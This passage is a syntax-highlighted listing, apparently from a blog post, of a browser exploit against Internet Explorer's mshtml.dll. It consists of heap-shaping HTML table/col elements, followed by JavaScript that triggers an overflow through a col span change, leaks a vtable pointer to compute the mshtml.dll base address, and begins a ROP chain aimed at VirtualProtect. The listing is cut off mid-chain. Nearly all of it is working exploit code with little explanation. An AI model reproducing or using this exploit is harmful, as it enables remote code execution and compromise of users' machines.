class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"74"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"75"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"76"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"77"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"78"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"79"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"80"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"81"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"82"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"83"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"84"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"85"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"86"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"87"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"88"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"89"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"90"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"91"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"92"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"93"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"94"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"95"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"96"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"97"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"98"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"99"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"100"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"101"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"102"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"103"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"104"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"105"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"106"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"107"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"108"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"109"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"110"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"111"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"112"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"113"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"114"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"115"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"116"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"117"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"118"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"119"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"120"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"121"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"122"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"123"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"124"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"125"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"126"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"127"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"128"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"129"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"130"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"131"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> mshtmlbase;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> leak_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="undefined">            leak_col.width = 41;</span></span><br><span class="line"><span class="undefined">            leak_col.span = 19;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">get_leak</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (al[i].length &gt; (<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> leak = al[i].substring((<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span> + (<span class="number">2</span> + <span class="number">8</span>) / <span class="number">2</span>, (<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span> + (<span class="number">2</span> + <span class="number">8</span> + <span class="number">4</span>) / <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">                    leak_addr = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="comment">//alert("虚表指针: 0x" + leak_addr.toString(16));</span></span></span><br><span class="line"><span class="undefined">                    mshtmlbase = leak_addr - 0x173af8;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">//alert("mshtml.dll基址: 0x" + mshtmlbase.toString(16));</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">get_ropchain</span>(<span class="params">mshtmlbase</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> arr = [</span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1d704</span>),</span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x6801b</span>),   <span class="comment">//# POP EBP # RETN</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x506603</span>),  <span class="comment">//# XCHG EAX,ESP # RETN</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x25d87c</span>),  <span class="comment">//# POP EAX # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1308</span>),    <span class="comment">//# ptr to &amp;VirtualProtect() [IAT mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1a02a1</span>),  <span class="comment">//# MOV EAX,DWORD PTR DS:[EAX] # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xcab0e</span>),   <span class="comment">//# XCHG 